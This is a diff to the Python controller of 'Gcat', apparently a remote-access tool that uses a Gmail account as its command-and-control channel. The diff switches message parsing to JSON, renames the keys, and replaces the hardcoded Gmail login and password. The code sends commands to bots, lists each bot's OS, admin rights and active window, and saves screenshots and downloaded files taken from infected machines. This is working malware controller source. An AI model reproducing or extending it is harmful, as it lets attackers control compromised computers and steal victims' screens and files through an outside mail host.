@@ -6,6 +6,7 @@ import uuid
 import string
 import ast
 import os
+import json
 import random
 
 from datetime import datetime
@@ -17,8 +18,8 @@ from email.MIMEText import MIMEText
 from email import Encoders
 
 #######################################
-gmail_user = 'gcat.test.mofo@gmail.com'
-gmail_pwd = 'prettyflypassword'
+gmail_user = 'gcat.is.the.shit@gmail.com'
+gmail_pwd = 'veryc00lp@ssw0rd'
 server = "smtp.gmail.com"
 server_port = 587
 #######################################
@@ -38,7 +39,7 @@ class msgparser:
         for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
             if payload.get_content_maintype() == 'text':
                 self.text = payload.get_payload()
-                self.dict = ast.literal_eval(payload.get_payload())
+                self.dict = json.loads(payload.get_payload())
 
             elif payload.get_content_maintype() == 'application':
                 self.attachment = payload.get_payload()
@@ -66,7 +67,7 @@ class Gcat:
         msg['From'] = sub_header
         msg['To'] = gmail_user
         msg['Subject'] = sub_header
-        msgtext = {'CMD': cmd, 'ARG': arg}
+        msgtext = json.dumps({'cmd': cmd, 'arg': arg})
         msg.attach(MIMEText(str(msgtext)))
         
         for attach in attachment:
@@ -101,7 +102,7 @@ class Gcat:
                 if botid not in bots:
                     bots.append(botid)
                     
-                    print botid, msg.dict['SYS']
+                    print botid, msg.dict['sys']
             
             except ValueError:
                 pass
@@ -117,12 +118,12 @@ class Gcat:
         for idn in idlist[0].split():
             msg_data = self.c.uid('fetch', idn, '(RFC822)')
             msg = msgparser(msg_data)
-            
+
             print "ID: " + botid
             print "DATE: '{}'".format(msg.date)
-            print "OS: " + msg.dict['SYS']
-            print "ADMIN: " + str(msg.dict['ADMIN']) 
-            print "FG WINDOW: '{}'\n".format(msg.dict['FGWINDOW'])
+            print "OS: " + msg.dict['sys']
+            print "ADMIN: " + str(msg.dict['admin']) 
+            print "FG WINDOWS: '{}'\n".format(msg.dict['fgwindow'])
 
     def getJobResults(self, botid, jobid):
 
@@ -138,14 +139,14 @@ class Gcat:
 
             print "DATE: '{}'".format(msg.date)
             print "JOBID: " + jobid
-            print "FG WINDOW: '{}'".format(msg.dict['FGWINDOW'])
-            print "CMD: '{}'".format(msg.dict['MSG']['CMD'])
+            print "FG WINDOWS: '{}'".format(msg.dict['fgwindow'])
+            print "CMD: '{}'".format(msg.dict['msg']['cmd'])
             print ''
-            print msg.dict['MSG']['RES'] + '\n'
+            print msg.dict['msg']['res'] + '\n'
 
             if msg.attachment:
 
-                if msg.dict['MSG']['CMD'] == 'screenshot':
+                if msg.dict['msg']['cmd'] == 'screenshot':
                     imgname = '{}-{}.png'.format(botid, jobid)
                     with open("./data/" + imgname, 'wb') as image:
                         image.write(b64decode(msg.attachment))
@@ -153,7 +154,7 @@ class Gcat:
 
                     print "[*] Screenshot saved to ./data/" + imgname
 
-                elif msg.dict['MSG']['CMD'] == 'download':
+                elif msg.dict['msg']['cmd'] == 'download':
                     filename = "{}-{}".format(botid, jobid)
                     with open("./data/" + filename, 'wb') as dfile:
                         dfile.write(b64decode(msg.attachment))
